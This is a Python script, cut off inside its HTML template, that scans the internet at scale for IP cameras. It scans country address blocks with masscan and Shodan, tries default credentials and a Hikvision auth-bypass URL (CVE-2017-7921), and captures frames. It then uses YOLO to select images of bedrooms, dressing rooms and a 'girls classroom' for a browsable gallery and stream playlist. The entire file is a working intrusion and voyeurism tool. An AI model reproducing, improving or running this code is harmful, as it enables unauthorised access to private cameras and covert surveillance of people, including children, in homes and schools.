#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════╗
║   WORLD EXTREME YOLO ROOM HUNTER v2 — Dva.12 Clearance          ║
║   Targets: bedrooms, wardrobe rooms, living rooms, classrooms    ║
║   Methods: masscan × 4 regions | TCP prescan | 200 ffmpeg       ║
║            workers | YOLO MP pool | Shodan | ONVIF | HTTP brute  ║
╚═══════════════════════════════════════════════════════════════════╝
"""

import os, re, sys, json, time, shutil, subprocess, signal, socket, random
import struct, hashlib, ipaddress, threading
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from multiprocessing import Pool, Manager, Queue, cpu_count
from pathlib import Path
from datetime import datetime, timezone

# ── Paths ──
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
WORK_DIR   = os.path.join(SCRIPT_DIR, "extreme_hunt")
FRAMES_DIR = os.path.join(WORK_DIR, "frames")
OUT_DIR    = os.path.join(WORK_DIR, "results")
IMG_DIR    = os.path.join(OUT_DIR, "screenshots")
MASSCAN_DIR= os.path.join(WORK_DIR, "masscan")
CIDR_DIR   = os.path.join(WORK_DIR, "cidrs")
LOG_FILE   = os.path.join(WORK_DIR, "hunt.log")
STATE_FILE = os.path.join(WORK_DIR, "state.json")
PROBED_FILE= os.path.join(WORK_DIR, "probed_ips.txt")
YOLO_MODEL = os.path.join(SCRIPT_DIR, "..", "..", "..", "yolov8n.pt")

for d in [WORK_DIR, FRAMES_DIR, OUT_DIR, IMG_DIR, MASSCAN_DIR, CIDR_DIR]:
    os.makedirs(d, exist_ok=True)

# ── Config — AGGRESSIVE MODE ──
MAX_TCP_WORKERS   = 800    # socket pre-scan threads (aggressive)
MAX_GRAB_WORKERS  = 350    # ffmpeg parallel (aggressive)
FFMPEG_TIMEOUT    = 3      # sec per attempt (faster timeout)
TCP_TIMEOUT       = 0.8    # sec for socket pre-scan (aggressive)
MASSCAN_RATE      = 250000 # pps per masscan instance (×4 = 1M effective)
TARGET_ROOMS      = 50000  # stop when found this many
YOLO_CONF         = 0.25   # lower = more detections
BATCH_LOG         = 200    # log every N IPs probed
MAX_PARALLEL_YOLO = max(3, cpu_count())  # use all cores for YOLO

# ── API Keys (optional, set in env) ──
SHODAN_API_KEY  = os.getenv("SHODAN_API_KEY", "")
CENSYS_API_ID   = os.getenv("CENSYS_API_ID", "")
CENSYS_API_SECRET = os.getenv("CENSYS_API_SECRET", "")

# ── Camera ports ── (ordered by RTSP/camera likelihood + aggressive extras)
CAM_PORTS = [554, 8000, 8080, 34567, 9000, 8888, 8081, 10554, 37777,
             8200, 8899, 9010, 9020, 6001, 65001, 443, 80,
             5554, 8001, 8443, 8554, 9080, 7001, 7070, 85, 81,
             1935, 5000, 5001, 8090, 18080, 8180, 4443, 83, 82]

# ── RTSP paths (by manufacturer — expanded) ──
RTSP_PATHS = {
    "hikvision":  ["/Streaming/Channels/101", "/Streaming/Channels/1",
                   "/Streaming/Channels/201", "/Streaming/Channels/301",
                   "/Streaming/Channels/102", "/ISAPI/Streaming/channels/101"],
    "dahua":      ["/cam/realmonitor?channel=1&subtype=0",
                   "/cam/realmonitor?channel=1&subtype=1",
                   "/h264/ch1/main/av_stream", "/h264/ch1/sub/av_stream",
                   "/live", "/channel1"],
    "generic":    ["/stream1", "/stream0", "/stream", "/live",
                   "/live/ch00_0", "/onvif1", "/onvif/1",
                   "/video1", "/video0", "/ch01.264", "/cam0_0",
                   "/11", "/12", "/1/1", "/media/video1",
                   "/user=admin_password=tlJwpbo6_channel=1_stream=0.sdp",
                   "/play1.sdp", "/play2.sdp", "/ch0_0.h264"],
    "axis":       ["/axis-media/media.amp", "/mjpg/video.mjpg",
                   "/mpeg4/media.amp"],
    "foscam":     ["/videoMain", "/videoSub", "/video.cgi",
                   "/videostream.cgi?user=admin&pwd="],
    "samsung":    ["/profile1/media.smp", "/profile2/media.smp"],
    "reolink":    ["/h264Preview_01_main", "/h264Preview_01_sub"],
    "xm":         ["/user=admin&password=&channel=1&stream=0.sdp"],
    "vivotek":    ["/live.sdp", "/video.mp4"],
    "uniview":    ["/media/video1", "/video1/media.amp"],
}
ALL_RTSP_PATHS = []
for paths in RTSP_PATHS.values():
    ALL_RTSP_PATHS.extend(paths)

# ── HTTP snapshot paths (no-auth + CVE bypass) ──
HTTP_SNAP_PATHS = [
    # CVE-2017-7921 Hikvision auth bypass (base64 admin:11)
    "/ISAPI/Streaming/channels/101/picture?auth=YWRtaW46MTEK",
    "/ISAPI/Streaming/channels/1/picture?auth=YWRtaW46MTEK",
    "/onvif-http/snapshot?auth=YWRtaW46MTEK",
    # Standard unauthenticated
    "/ISAPI/Streaming/channels/101/picture",
    "/ISAPI/Streaming/channels/1/picture",
    "/cgi-bin/snapshot.cgi",
    "/snap.jpg", "/snapshot.jpg", "/image.jpg", "/img/snapshot.cgi",
    "/Streaming/channels/1/picture",
    "/tmpfs/auto.jpg", "/webcapture.jpg",
    "/cgi-bin/images_cgi?channel=0",
    "/onvif/snapshot",
    "/image/jpeg.cgi",
    "/cgi/jpg/image.cgi",
    "/GetData.cgi?CH=0",
    "/shot.jpg",
    "/mjpg/snapshot.cgi?ImageFormat=jpg",
    "/SnapshotJPEG?Resolution=640x480",
    # Dahua
    "/cgi-bin/snapshot.cgi?channel=0",
    "/cgi-bin/snapshot.cgi?channel=1",
    # Reolink / generic
    "/cgi-bin/api.cgi?cmd=Snap&channel=0",
    "/webcam.jpg",
    "/jpeg/1/image.jpg",
    "/capture/channel0",
    # Uniview / ONVIF
    "/images/snapshot.jpg",
    "/stw-cgi/video.cgi?msubmenu=snapshot&action=view",
]

# ── Credentials (ordered by frequency — expanded aggressive) ──
CREDS = [
    ("",       ""),          # no-auth (very common!)
    ("admin",  ""),
    ("admin",  "admin"),
    ("admin",  "12345"),
    ("admin",  "123456"),
    ("admin",  "1111"),
    ("admin",  "password"),
    ("admin",  "1234"),
    ("admin",  "00000"),
    ("admin",  "888888"),
    ("admin",  "admin123"),
    ("admin",  "pass"),
    ("admin",  "P@ssw0rd"),
    ("admin",  "qwerty"),
    ("admin",  "abc123"),
    ("admin",  "111111"),
    ("admin",  "camera"),
    ("admin",  "security"),
    ("admin",  "hikvision"),
    ("admin",  "hik12345"),
    ("admin",  "Hik12345"),
    ("admin",  "admin1"),
    ("admin",  "4321"),
    ("admin",  "password1"),
    ("root",   ""),
    ("root",   "pass"),
    ("root",   "1234"),
    ("root",   "root"),
    ("root",   "12345"),
    ("root",   "admin"),
    ("root",   "vizxv"),
    ("root",   "xc3511"),
    ("root",   "anko"),
    ("root",   "GM8182"),
    ("root",   "icatch99"),
    ("root",   "juantech"),
    ("root",   "zlxx."),
    ("user",   ""),
    ("user",   "user"),
    ("guest",  ""),
    ("guest",  "guest"),
    ("service", "service"),
    ("supervisor", "supervisor"),
    ("default", ""),
    ("666666", "666666"),
    ("888888", "888888"),
    ("ubnt",   "ubnt"),
    ("support", "support"),
    ("Admin",  "1234"),
    ("admin1", "password"),
]

# ── Countries — FULL AGGRESSIVE worldwide (priority: CO/RU/UA/VE first) ──
COUNTRIES = [
    # !! PRIORITY TARGETS — scan these FIRST !!
    "co",  # Colombia — massive residential cam density
    "ru",  # Russia — huge IP space, weak security
    "ua",  # Ukraine — high cam density, default creds
    "ve",  # Venezuela — low security awareness
    # CIS / Eastern Europe (very high hit rate)
    "by", "kz", "uz", "az", "ge", "am", "md", "kg", "tj", "tm",
    # Latin America — residential cams everywhere
    "br", "mx", "ar", "cl", "pe", "ec", "bo", "py", "uy",
    "pa", "cr", "do", "cu", "gt", "hn", "sv", "ni", "pr",
    "tt", "jm", "ht", "bz", "sr", "gy",
    # Europe — full coverage
    "es", "it", "fr", "de", "pt", "nl", "be", "gr", "tr",
    "ro", "pl", "cz", "hu", "bg", "rs", "hr", "sk", "si",
    "lt", "lv", "ee", "fi", "se", "no", "dk", "at", "ch",
    "al", "ba", "mk", "me", "cy", "mt", "is", "lu", "ie", "gb",
    # Middle East — rich residential, weak camera security
    "ir", "iq", "sa", "ae", "il", "jo", "lb", "kw", "qa",
    "bh", "om", "sy", "ye", "ps",
    # Asia — massive IP space
    "cn", "in", "id", "ph", "vn", "th", "my", "pk", "bd",
    "kr", "jp", "tw", "mm", "np", "lk", "kh", "la", "mn",
    "hk", "sg", "bn", "tl", "mv",
    # Africa — expanding cam market, default creds rampant
    "za", "eg", "ng", "ke", "et", "gh", "tz", "ug", "cm",
    "sn", "ci", "ma", "dz", "tn", "ly", "ao", "mz", "zw",
    "bw", "na", "rw", "cd", "cg", "ga", "sd", "ss", "so",
    "mg", "mu", "zm", "mw", "ml", "bf", "ne", "td", "tg", "bj",
    "gn", "sl", "lr", "gm", "cv", "gw", "km", "dj", "er", "bi",
    # Oceania
    "au", "nz", "fj", "pg",
    # Caribbean extra
    "bb", "bs", "ag", "dm", "gd", "kn", "lc", "vc",
]

# ── YOLO COCO Class IDs ──
# 0=person, 24=backpack, 26=handbag, 28=suitcase
# 56=chair, 57=couch, 58=potted plant
# 59=bed, 60=dining table, 62=tv monitor
# 63=laptop, 66=keyboard, 67=cell phone
# 73=book, 74=clock, 75=vase

# ── Room categories with YOLO rules ──
ROOM_RULES = {
    "bedroom": {
        "require":   {59},                    # MUST have: bed
        "boost":     {56, 57, 62, 74, 28},    # chair/couch/tv/clock/suitcase
        "min_boost": 0,
        "label":     "🛏️ Bedroom",
        "priority":  1,
        "color":     "#ff6b6b",
        "wardrobe_cv": True,  # also run CV wardrobe check
    },
    "wardrobe_room": {
        "require":   {59},                    # bed required
        "boost":     {28, 26, 24},            # suitcase/handbag/backpack = clothing items
        "min_boost": 1,
        "label":     "🚪 Wardrobe/Dressing Room",
        "priority":  2,
        "color":     "#ff9f43",
    },
    "girls_classroom": {
        "require":   set(),
        "boost":     {56, 0, 63, 73, 60},     # chair/person/laptop/book/table
        "min_boost": 3,
        "person_min": 2,                       # at least 2 people for classroom
        "label":     "🏫 Girls Classroom",
        "priority":  3,
        "color":     "#45b7d1",
    },
    "living_room": {
        "require":   {57},                    # couch
        "boost":     {62, 56, 74, 75},       # tv/chair/clock/vase
        "min_boost": 0,
        "label":     "🛋️ Living Room",
        "priority":  4,
        "color":     "#ffd700",
    },
    "any_indoor": {
        "require":   set(),
        "boost":     {59, 56, 57, 60, 62, 63, 73, 74},
        "min_boost": 3,
        "label":     "🏠 Indoor Room",
        "priority":  5,
        "color":     "#9b59b6",
    },
}

stop_flag  = False
found_lock = threading.Lock()
probed_set = set()

try:
    if os.path.exists(PROBED_FILE):
        with open(PROBED_FILE) as f:
            probed_set = set(line.strip() for line in f if line.strip())
        print(f"[*] Loaded {len(probed_set)} already-probed IPs")
except Exception:
    pass


def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(line + "\n")
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════
# DISCOVERY METHOD 1: Multi-region masscan
# ═══════════════════════════════════════════════════════════════════

def download_cidrs():
    """Download CIDR blocks for all countries. Returns combined file path."""
    all_file = os.path.join(CIDR_DIR, "all.txt")
    if os.path.exists(all_file) and os.path.getsize(all_file) > 500_000:
        n = sum(1 for _ in open(all_file))
        log(f"[CIDR] Cached: {n} blocks for {len(COUNTRIES)} countries")
        return all_file

    log(f"[CIDR] Downloading CIDR blocks for {len(COUNTRIES)} countries...")
    total = 0
    with open(all_file, 'w') as out:
        for cc in COUNTRIES:
            cc_file = os.path.join(CIDR_DIR, f"{cc}.zone")
            if os.path.exists(cc_file) and os.path.getsize(cc_file) > 50:
                blocks = [l.strip() for l in open(cc_file) if l.strip() and '/' in l]
            else:
                try:
                    r = subprocess.run(
                        ["curl", "-sL", "--connect-timeout", "8", "--max-time", "15",
                         f"https://www.ipdeny.com/ipblocks/data/countries/{cc}.zone"],
                        capture_output=True, text=True, timeout=20
                    )
                    if r.returncode == 0 and r.stdout.strip():
                        with open(cc_file, 'w') as f:
                            f.write(r.stdout)
                        blocks = [l.strip() for l in r.stdout.split('\n') if l.strip() and '/' in l]
                    else:
                        continue
                except Exception:
                    continue
            for b in blocks:
                out.write(b + "\n")
            total += len(blocks)

    log(f"[CIDR] Total: {total} CIDR blocks")
    return all_file


def launch_background_masscans(cidr_file):
    """Launch 4 masscan instances in the BACKGROUND — do NOT wait for them."""
    port_sets = [
        "554,8000",
        "8080,34567",
        "9000,8888,37777",
        "8200,8899,9010,9020,6001,10554",
    ]
    log(f"[MASSCAN] Launching {len(port_sets)} background scans @ {MASSCAN_RATE} pps each...")
    procs = []
    for i, ports in enumerate(port_sets):
        out = os.path.join(MASSCAN_DIR, f"scan_{i}.txt")
        cmd = [
            "masscan", "-iL", cidr_file, "-p", ports,
            "--rate", str(MASSCAN_RATE), "--open-only",
            "--exclude", "255.255.255.255", "-oG", out,
        ]
        try:
            p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                  stderr=subprocess.DEVNULL)
            procs.append((i, p, out))
            time.sleep(1)
        except Exception as e:
            log(f"  [masscan-{i}] failed to start: {e}")
    log(f"  → {len(procs)} masscan instances running in background (non-blocking)")
    return procs


def parse_all_existing_ips():
    """
    Immediately parse ALL existing scan files (no waiting).
    Returns prioritized list of IPs to probe right now.
    """
    ip_ports = {}

    # All possible scan file locations
    scan_files = [
        os.path.join(SCRIPT_DIR, "spain_masscan.txt"),
        os.path.join(SCRIPT_DIR, "world_hunt/masscan/world_masscan.txt"),
    ]
    # Add streaming extreme_hunt scan files (partial — being written NOW)
    for i in range(4):
        scan_files.append(os.path.join(MASSCAN_DIR, f"scan_{i}.txt"))

    total_lines = 0
    for mf in scan_files:
        if not os.path.exists(mf):
            continue
        try:
            with open(mf, 'rb') as f:
                for raw in f:
                    try:
                        line = raw.decode('utf-8', errors='ignore')
                    except Exception:
                        continue
                    m = re.search(r'Host:\s+(\d+\.\d+\.\d+\.\d+).*Ports:\s+(\d+)/', line)
                    if m:
                        ip, port = m.group(1), m.group(2)
                        ip_ports.setdefault(ip, set()).add(port)
                        total_lines += 1
        except Exception:
            continue

    t1, t2, t3, t4 = [], [], [], []
    skip = probed_set
    for ip, ports in ip_ports.items():
        if ip in skip:
            continue
        if '554' in ports:
            t1.append(ip)
        elif '8000' in ports:
            t2.append(ip)
        elif ports & {'8080', '34567', '9000', '8888', '37777', '10554'}:
            t3.append(ip)
        else:
            t4.append(ip)

    for lst in [t1, t2, t3, t4]:
        random.shuffle(lst)

    total = len(t1) + len(t2) + len(t3) + len(t4)
    log(f"[PARSE] {total_lines} scan lines → RTSP:{len(t1)} Hikv:{len(t2)} HTTP:{len(t3)} Other:{len(t4)} = {total} IPs")
    return t1 + t2 + t3 + t4


def stream_new_ips(known_ips, interval=30):
    """
    Background thread: every `interval` seconds re-parse scan files
    and push newly discovered IPs into a queue.
    """
    def _worker(queue, known):
        while not stop_flag:
            time.sleep(interval)
            try:
                fresh = parse_all_existing_ips()
                new = [ip for ip in fresh if ip not in known]
                for ip in new:
                    known.add(ip)
                    queue.put(ip)
                if new:
                    log(f"  [STREAM] +{len(new)} new IPs from ongoing masscans")
            except Exception:
                pass

    q = __import__('queue').Queue()
    known = set(known_ips)
    t = threading.Thread(target=_worker, args=(q, known), daemon=True)
    t.start()
    return q


# ═══════════════════════════════════════════════════════════════════
# DISCOVERY METHOD 2: Shodan API
# ═══════════════════════════════════════════════════════════════════

def shodan_search_cameras():
    """Search Shodan for camera IPs if API key available."""
    if not SHODAN_API_KEY:
        return []

    try:
        import shodan
        api = shodan.Shodan(SHODAN_API_KEY)
        log("[SHODAN] Searching for camera streams...")

        queries = [
            'port:554 product:"Hikvision" country:any',
            'port:8000 "Hikvision" has_screenshot:true',
            'port:554 "rtsp" has_screenshot:true',
            'title:"Network Camera" port:80',
            '"DVR" port:34567',
            'title:"IP Camera" port:80',
        ]

        ips = set()
        for q in queries:
            try:
                results = api.search(q, limit=1000)
                for r in results.get('matches', []):
                    ips.add(r['ip_str'])
            except Exception as e:
                log(f"  [SHODAN] Query failed: {e}")
            time.sleep(1)

        log(f"[SHODAN] Found {len(ips)} camera IPs")
        return list(ips)
    except ImportError:
        log("[SHODAN] shodan library not installed, skipping")
        return []


# ═══════════════════════════════════════════════════════════════════
# DISCOVERY METHOD 3: ONVIF WS-Discovery (broadcast probe)
# ═══════════════════════════════════════════════════════════════════

ONVIF_PROBE = b"""<?xml version="1.0" encoding="UTF-8"?>
<e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope"
            xmlns:w="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:d="http://schemas.xmlsoap.org/ws/2005/04/discovery"
            xmlns:dn="http://www.onvif.org/ver10/network/wsdl">
  <e:Header>
    <w:MessageID>urn:uuid:fed6de7b-e64c-44f3-8c34-dc9dcdf5e1e0</w:MessageID>
    <w:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</w:To>
    <w:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</w:Action>
  </e:Header>
  <e:Body>
    <d:Probe>
      <d:Types>dn:NetworkVideoTransmitter</d:Types>
    </d:Probe>
  </e:Body>
</e:Envelope>"""

def onvif_discover_local():
    """Send WS-Discovery multicast to find local ONVIF cameras."""
    ips = set()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.settimeout(3)
        sock.sendto(ONVIF_PROBE, ('239.255.255.250', 3702))
        while True:
            try:
                data, addr = sock.recvfrom(4096)
                ips.add(addr[0])
            except socket.timeout:
                break
    except Exception:
        pass
    if ips:
        log(f"[ONVIF] Local discovery: {len(ips)} cameras — {list(ips)[:5]}")
    return list(ips)


# ═══════════════════════════════════════════════════════════════════
# DISCOVERY METHOD 4: Random IPv4 sampling on camera ports
# (supplemental — fills gaps between masscan runs)
# ═══════════════════════════════════════════════════════════════════

RESERVED_RANGES = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("100.64.0.0/10"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("198.18.0.0/15"),
    ipaddress.ip_network("224.0.0.0/4"),
    ipaddress.ip_network("240.0.0.0/4"),
]

def random_public_ip():
    """Generate a random public IPv4 address."""
    while True:
        a = random.randint(1, 223)
        b = random.randint(0, 255)
        c = random.randint(0, 255)
        d = random.randint(1, 254)
        ip_obj = ipaddress.ip_address(f"{a}.{b}.{c}.{d}")
        if not any(ip_obj in net for net in RESERVED_RANGES):
            return str(ip_obj)


def tcp_prescan_batch(ips_ports):
    """Fast TCP connect pre-scan. Returns list of (ip, port) that are open."""
    open_targets = []

    def check(ip, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(TCP_TIMEOUT)
            rc = s.connect_ex((ip, port))
            s.close()
            return rc == 0
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=MAX_TCP_WORKERS) as pool:
        futures = {pool.submit(check, ip, port): (ip, port)
                   for ip, port in ips_ports}
        for future in as_completed(futures):
            ip, port = futures[future]
            if future.result():
                open_targets.append((ip, port))

    return open_targets


# ═══════════════════════════════════════════════════════════════════
# FRAME GRABBING — TCP pre-scan optimized
# ═══════════════════════════════════════════════════════════════════

def grab_frame_optimized(ip, known_ports=None):
    """
    1. TCP pre-scan to find open camera ports
    2. Try unauthenticated HTTP snap first (fastest)
    3. Then try RTSP with top credentials
    """
    out_file = os.path.join(FRAMES_DIR, ip.replace('.', '_') + '.jpg')
    if os.path.exists(out_file) and os.path.getsize(out_file) > 5000:
        return (ip, out_file)

    # Probe ports to discover what's open
    if known_ports:
        open_ports = list(known_ports)
    else:
        # Quick TCP scan of top 4 camera ports
        open_ports = []
        for port in [554, 8000, 8080, 34567]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(TCP_TIMEOUT)
                if s.connect_ex((ip, port)) == 0:
                    open_ports.append(port)
                s.close()
            except Exception:
                pass
        if not open_ports:
            return None

    # ── Try HTTP snapshot endpoints first (fastest, no RTSP handshake) ──
    http_ports = [p for p in open_ports if p in [80, 8000, 8080, 8200, 8899, 9010, 37777]]
    for port in http_ports[:2]:
        for snap_path in HTTP_SNAP_PATHS[:8]:
            # Try no-auth first, then admin:12345
            for user, pwd in [("", ""), ("admin", "12345"), ("admin", "")]:
                auth_str = f"{user}:{pwd}@" if user else ""
                url = f"http://{auth_str}{ip}:{port}{snap_path}"
                try:
                    subprocess.run(
                        ["ffmpeg", "-nostdin", "-y", "-i", url,
                         "-vframes", "1", "-f", "image2", out_file],
                        capture_output=True, timeout=FFMPEG_TIMEOUT
                    )
                    if os.path.exists(out_file) and os.path.getsize(out_file) > 5000:
                        return (ip, out_file)
                except (subprocess.TimeoutExpired, Exception):
                    pass

    # ── Try RTSP on all detected RTSP-capable ports ──
    rtsp_ports = [p for p in open_ports if p in [554, 5554, 8554, 10554, 1935]]
    if not rtsp_ports and not open_ports:
        rtsp_ports = [554]  # guess
    for rport in rtsp_ports:
        for user, pwd in CREDS[:15]:  # Top 15 creds (aggressive)
            auth = f"{user}:{pwd}@" if user else ""
            for path in ALL_RTSP_PATHS[:14]:  # Top 14 paths
                url = f"rtsp://{auth}{ip}:{rport}{path}"
                try:
                    subprocess.run(
                        ["ffmpeg", "-nostdin", "-rtsp_transport", "tcp",
                         "-i", url, "-vframes", "1", "-f", "image2", "-y", out_file],
                        capture_output=True, timeout=FFMPEG_TIMEOUT
                    )
                    if os.path.exists(out_file) and os.path.getsize(out_file) > 5000:
                        return (ip, out_file)
                except (subprocess.TimeoutExpired, Exception):
                    pass

    # ── Try Dahua/XM port 34567 + other RTSP-capable ports ──
    alt_rtsp_ports = [p for p in open_ports if p in [34567, 37777, 9000, 8000, 7001, 7070, 5000, 6001, 65001]]
    for aport in alt_rtsp_ports:
        for user, pwd in CREDS[:10]:  # Top 10 creds
            auth = f"{user}:{pwd}@" if user else ""
            for dpath in ["/cam/realmonitor?channel=1&subtype=0",
                          "/cam/realmonitor?channel=1&subtype=1",
                          "/h264/ch1/main/av_stream",
                          "/stream1", "/live", "/1/1",
                          "/user=admin&password=&channel=1&stream=0.sdp",
                          "/video1"]:
                url = f"rtsp://{auth}{ip}:{aport}{dpath}"
                try:
                    subprocess.run(
                        ["ffmpeg", "-nostdin", "-rtsp_transport", "tcp",
                         "-i", url, "-vframes", "1", "-f", "image2", "-y", out_file],
                        capture_output=True, timeout=FFMPEG_TIMEOUT
                    )
                    if os.path.exists(out_file) and os.path.getsize(out_file) > 5000:
                        return (ip, out_file)
                except (subprocess.TimeoutExpired, Exception):
                    pass

    # Cleanup
    if os.path.exists(out_file) and os.path.getsize(out_file) < 5000:
        try: os.unlink(out_file)
        except: pass
    return None


# ═══════════════════════════════════════════════════════════════════
# YOLO CLASSIFICATION — multiprocessing pool, wardrobe CV assist
# ═══════════════════════════════════════════════════════════════════

def _yolo_worker_init():
    """Called once per worker process — load YOLO model into process."""
    global _model
    try:
        from ultralytics import YOLO
        model_path = YOLO_MODEL
        if not os.path.exists(model_path):
            model_path = "yolov8n.pt"
        _model = YOLO(model_path)
    except Exception as e:
        _model = None
        print(f"[YOLO worker] init error: {e}")


def _yolo_classify(args):
    """Worker function — classify a batch of frames with YOLO."""
    filepath, = args
    global _model
    if _model is None:
        return None

    try:
        import cv2
        import numpy as np

        results = _model(filepath, conf=YOLO_CONF, verbose=False)
        detections = {}
        for r in results:
            for box in r.boxes:
                cls_id = int(box.cls[0])
                conf = float(box.conf[0])
                name = r.names[cls_id]
                if cls_id not in detections:
                    detections[cls_id] = {"name": name, "count": 0, "max_conf": 0}
                detections[cls_id]["count"] += 1
                detections[cls_id]["max_conf"] = max(detections[cls_id]["max_conf"], conf)

        if not detections:
            return None

        detected_ids = set(detections.keys())
        obj_summary = ", ".join(f"{v['name']}×{v['count']}" for v in detections.values())
        person_count = detections.get(0, {}).get("count", 0)

        # ── Wardrobe CV check: look for large uniform-color rectangular region ──
        has_wardrobe_indicator = False
        try:
            img = cv2.imread(filepath)
            if img is not None:
                h, w = img.shape[:2]
                # Check for hanging clothes: vertical texture in lower 2/3
                gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
                roi = gray[h//3:, w//4:3*w//4]
                # Wardrobe often has dark rectangular region with vertical edges
                edges = cv2.Canny(roi, 30, 90)
                edge_vert_ratio = np.sum(edges[:, :] > 0) / (roi.shape[0] * roi.shape[1])
                if edge_vert_ratio > 0.12:
                    has_wardrobe_indicator = True
        except Exception:
            pass

        # ── Score each room type ──
        best_match = None
        best_score = 0
        best_priority = 99

        for room_type, rules in ROOM_RULES.items():
            require = rules["require"]
            boost = rules.get("boost", set())
            min_boost = rules.get("min_boost", 0)
            person_min = rules.get("person_min", 0)

            # Must-have check
            if require and not require.issubset(detected_ids):
                continue

            # Minimum person count for classroom
            if person_min and person_count < person_min:
                continue

            # Boost score
            boost_found = boost & detected_ids
            if min_boost and len(boost_found) < min_boost:
                continue

            score = 0
            for cls_id in require:
                if cls_id in detections:
                    score += detections[cls_id]["max_conf"] * 3.0
            for cls_id in boost_found:
                score += detections[cls_id]["max_conf"]
            if room_type == "girls_classroom":
                score += person_count * 0.4
            if room_type == "wardrobe_room" and has_wardrobe_indicator:
                score += 0.5

            if score > best_score:
                best_score = score
                best_match = room_type
                best_priority = rules["priority"]

        if best_match:
            return {
                "room_type": best_match,
                "room_label": ROOM_RULES[best_match]["label"],
                "yolo_score": float(best_score),
                "priority": best_priority,
                "objects": obj_summary,
                "has_wardrobe": has_wardrobe_indicator,
                "person_count": person_count,
            }
        return None

    except Exception as e:
        return None


# ═══════════════════════════════════════════════════════════════════
# HTML SELECTOR — real-time update
# ═══════════════════════════════════════════════════════════════════

def build_selector(rooms, extra_stats=None):
    """Write manifest + M3U + live HTML selector."""

    for cam in rooms:
        src = cam.get("frame_path", "")
        if src and os.path.exists(src):
            dst = os.path.join(IMG_DIR, os.path.basename(src))
            if not os.path.exists(dst):
                try: shutil.copy2(src, dst)
                except: pass
            cam["screenshot_url"] = f"screenshots/{os.path.basename(src)}"

    type_counts = {}
    for r in rooms:
        rt = r.get("room_type", "unknown")
        type_counts[rt] = type_counts.get(rt, 0) + 1

    manifest = {
        "title": "🌍 EXTREME World Room Hunter",
        "timestamp": str(int(time.time())),
        "total": len(rooms),
        "type_counts": type_counts,
        "stats": extra_stats or {},
        "cameras": rooms,
    }
    with open(os.path.join(OUT_DIR, "manifest.json"), 'w') as f:
        json.dump(manifest, f, indent=2)

    m3u = "#EXTM3U\n# WORLD EXTREME ROOM HUNTER\n"
    for cam in rooms:
        label = cam.get("room_label", "Room")
        if cam.get("rtsp_urls"):
            m3u += f"#EXTINF:-1,[{label}] {cam['ip']}\n{cam['rtsp_urls'][0]}\n\n"
    with open(os.path.join(OUT_DIR, "cameras.m3u"), 'w') as f:
        f.write(m3u)

    html = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>🌍 World Room Hunter EXTREME</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050505;color:#eee;font-family:'Segoe UI',sans-serif;padding:12px}
.hdr{text-align:center;padding:14px 0}
.hdr h1{font-size:1.9em;background:linear-gradient(135deg,#ff6b6b,#ffd700,#4ecdc4,#45b7d1);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:900}
.hdr p{color:#666;font-size:0.9em;margin-top:4px}
.stats{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin:14px 0}
.scard{background:#111;border:1px solid #222;border-radius:8px;padding:10px 16px;text-align:center;min-width:110px}
.scard .val{font-size:1.6em;font-weight:900;display:block}
.scard .lbl{font-size:0.75em;color:#666;margin-top:2px}
.scard.bed .val{color:#ff6b6b}
.scard.cls .val{color:#45b7d1}
.scard.liv .val{color:#ffd700}
.scard.total .val{color:#4ecdc4}
.filters{display:flex;gap:6px;justify-content:center;flex-wrap:wrap;margin:10px 0}
.fb{padding:8px 14px;border-radius:20px;border:1px solid #333;background:#111;
    color:#aaa;cursor:pointer;font-size:0.87em;transition:all 0.15s}
.fb:hover{border-color:#666;color:#fff}
.fb.on{border-color:#4ecdc4;background:#0a2a2a;color:#4ecdc4;font-weight:600}
.ctrls{display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin:10px 0}
.btn{padding:9px 18px;border-radius:6px;border:none;cursor:pointer;font-weight:700;font-size:0.87em}
.btn-teal{background:#4ecdc4;color:#000}
.btn-red{background:#ff6b6b;color:#fff}
.btn-gray{background:#222;color:#aaa;border:1px solid #333}
.updated{text-align:center;font-size:0.8em;color:#444;margin-bottom:10px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:10px}
.card{background:#111;border:2px solid #1e1e1e;border-radius:8px;overflow:hidden;
      cursor:pointer;transition:all 0.15s;position:relative}
.card:hover{border-color:#333;transform:translateY(-2px);box-shadow:0 6px 20px #0008}
.card.sel{border-color:#ff6b6b;box-shadow:0 0 14px #ff6b6b44}
.badge{position:absolute;top:7px;right:7px;padding:3px 9px;border-radius:12px;
       font-size:0.73em;font-weight:700;z-index:3;backdrop-filter:blur(2px)}
.ckb{position:absolute;top:8px;left:8px;width:18px;height:18px;z-index:4;cursor:pointer;accent-color:#ff6b6b}
.card img{width:100%;height:165px;object-fit:cover;display:block}
.info{padding:8px 10px 5px}
.ip{color:#4ecdc4;font-weight:700;font-size:0.88em;word-break:break-all}
